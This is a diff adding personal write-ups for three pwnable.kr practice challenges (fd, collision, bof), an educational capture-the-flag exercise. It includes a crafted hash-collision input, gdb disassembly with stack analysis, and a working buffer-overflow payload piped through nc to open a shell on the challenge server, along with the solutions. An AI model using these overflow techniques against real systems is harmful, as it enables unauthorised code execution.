@@ -1,3 +1,10 @@
+How to access the challenge in the first place:
+1. go to pwnable.kr using a web browser
+2. get access to a terminal that can use ssh (since I have Windows, I downloaded a Linux VM on VirtualBox)
+3. open a terminal and type in the ssh statement in the challenge description
+4. you should have access, you can now use terminal commands like ls to look through the beginning levels for files
+
+-----------------------------------------
 Fd
 
 int fd = atoi( argv[1] ) - 0x1234;
@@ -18,3 +25,101 @@ That doesn't get you the flag, though - the strcmp function checks if buf (or no
 Solution:
 4660
 LETMEWIN\n
+
+-----------------------------------------
+Collision
+
+unsigned long hashcode = 0x21DD09EC;
+unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i<5; i++){
+		res += ip[i];
+	}
+	return res;
+}
+
+After looking through the program, I realized that in order to get the flag, the return value of the check_password function must be equivalent to hashcode (0x21DD09EC). But how do I actually get there?
+
+check_password takes in a 20 character string, and essentially reads it in 4 characters at a time and then adds them for the final result. So if you had a string like "\x11" * 20, the return value would be "\x55\x55\x55\x55". So all you basically need to do is come up with five four byte strings that add up to 0x21DD09EC. 
+
+The way I did it makes the five strings add up to 121DD09EC (notice the additional 1 at the front), and it works because res only accounts for the last 8 digits.
+
+I initially came up with the string of "\x33" * 16 + "\x20\x3d\x10\x55", but the final string ends with a 20 (little-endian makes the actual string 55103d20). 
+I soon realized though that the program had issues with 0 ending the string, so I had to ensure that the final byte wasn't a 0 in each of the four byte strings. So, I instead had to do "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55".
+
+Solution:
+./col $(python -c 'print "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55"')
+
+
+-----------------------------------------
+Bof
+
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+
+So this particular challenge talked about the issue of buffer overflow. The first thing to realize is that the array overflowme doesn't have a size limit, and as such, giving the array more than 32 characters makes the data you put in overflow into memory you're not supposed to have access to. So we want to overflow the value of key, which currently is 0xdeadbeef, with the value of 0xcafebabe, so that we can end up with a shell. 
+
+The problem now is how much I need to overflow before I can finally access the memory for key. I could just randomly put in A's and then add in a \xfe\xca\xbe\ba, but I instead used gdb to find the exact value. 
+
+I booted up gdb and disassembled the func function to get this in assembly:
+gdb-peda$ disas func
+Dump of assembler code for function func:
+   0x8000062c <+0>:	push   ebp
+   0x8000062d <+1>:	mov    ebp,esp
+   0x8000062f <+3>:	sub    esp,0x48
+=> 0x80000632 <+6>:	mov    eax,gs:0x14
+   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
+   0x8000063b <+15>:	xor    eax,eax
+   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
+   0x80000644 <+24>:	call   0xb7e630d0 <_IO_puts>
+   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
+   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
+   0x8000064f <+35>:	call   0xb7e62820 <_IO_gets>
+   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x8000065b <+47>:	jne    0x8000066b <func+63>
+   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
+   0x80000664 <+56>:	call   0xb7e3e850 <__libc_system>
+   0x80000669 <+61>:	jmp    0x80000677 <func+75>
+   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
+   0x80000672 <+70>:	call   0xb7e630d0 <_IO_puts>
+   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
+   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
+   0x80000681 <+85>:	je     0x80000688 <func+92>
+   0x80000683 <+87>:	call   0xb7ef9560 <__stack_chk_fail>
+   0x80000688 <+92>:	leave  
+   0x80000689 <+93>:	ret   
+
+The important line in all the assembly above is 0x80000654, or func+40. That line compares the value of ebp+8 (presumably key's memory location) with the value of 0xcafebabe. So I set a breakpoint there.
+
+On the way to accessing the breakpoint, I was asked to give input for the overflow me buffer, which I proceeded to overflow with a random amount of A's.
+
+At the breakpoint, I then examine the registers to see where the value of the overflowme variable is.
+
+Since I use gdb-peda, the stack data shown shows me that the variable is at 0xbffff3cc.
+
+0000| 0xbffff3b0 --> 0xbffff3cc ('A' <repeats 47 times>)
+0004| 0xbffff3b4 --> 0xbffff454 --> 0x3b2cb624 
+0008| 0xbffff3b8 --> 0xb7fb3000 --> 0x1aedb0 
+0012| 0xbffff3bc --> 0x9027 
+0016| 0xbffff3c0 --> 0xffffffff 
+0020| 0xbffff3c4 --> 0x2f ('/')
+0024| 0xbffff3c8 --> 0xb7e10dc8 --> 0x2b76 ('v+')
+0028| 0xbffff3cc ('A' <repeats 47 times>)
+
+Since I know that overflowme is at 0xbffff3cc and $ebp+8 (aka key variable) is at 0xbffff400, I can calculate that 0xbffff400 - 0xbffff3cc = 52. So I need to overflow 52 characters into overflowme and then add 0xcafebabe to finally overwrite the key variable.
+
+In the solution below, besides the standard python script, the ; cat - is necessary to keep the program open while I utilize the open shell.
+
+Solution:
+(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
